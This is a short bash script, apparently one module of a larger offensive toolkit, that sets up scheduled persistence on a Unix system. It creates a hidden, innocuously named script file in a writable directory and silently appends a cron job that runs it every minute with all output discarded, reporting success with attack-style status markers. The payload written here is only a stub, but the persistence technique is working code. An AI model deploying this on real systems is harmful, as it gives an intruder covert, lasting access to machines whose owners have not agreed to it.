#!/bin/bash
# -----------------------------------------------------------------------------
# Establishes scheduled persistence using the system task scheduler.
# -----------------------------------------------------------------------------

_have crontab || exit 0

PAYLOAD_DIR="$(_resolve_writable_dir)"
PAYLOAD="$PAYLOAD_DIR/.sys_sync.sh"
CRON_CMD="* * * * * /bin/sh $PAYLOAD >/dev/null 2>&1"

if [ ! -f "$PAYLOAD" ]; then
    printf '#!/bin/sh\nexit 0\n' > "$PAYLOAD" 2>/dev/null
    chmod +x "$PAYLOAD" 2>/dev/null
fi

[ -f "$PAYLOAD" ] || exit 0

(
    if crontab -l 2>/dev/null | grep -qF "$PAYLOAD"; then
        printf '[*] Scheduled task already registered for %s\n' "$PAYLOAD"
    else
        ( crontab -l 2>/dev/null; printf '%s\n' "$CRON_CMD" ) | crontab - 2>/dev/null && \
            printf '[+] Registered scheduled task: %s\n' "$CRON_CMD"
    fi
) | label "Scheduled Task Persistence"
